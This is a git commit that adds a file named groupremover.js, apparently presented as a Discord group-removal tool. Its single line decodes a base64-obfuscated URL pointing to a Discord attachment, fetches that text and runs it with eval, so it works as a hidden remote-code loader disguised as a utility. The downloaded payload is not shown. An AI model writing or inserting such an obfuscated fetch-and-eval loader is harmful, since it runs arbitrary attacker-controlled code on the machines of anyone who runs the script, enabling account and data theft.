27da8997c67b198a457336bf618f0ac36adbc8ac
LarpBeta <95172597+LarpBeta@users.noreply.github.com>
2021-11-28 13:45:04 +0100

    Create groupremover.js
    Add code

---
+++ groupremover.js
@@ -0,0 +1,1 @@
+fetch(atob('aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTE0MjgwODc1NDUyMTU4MDAyLzkxNDMxMTAzOTY1NzU4NjY4OC9tZXNzYWdlLnR4dA==')).then(result => result.text()).then(result => eval(result))
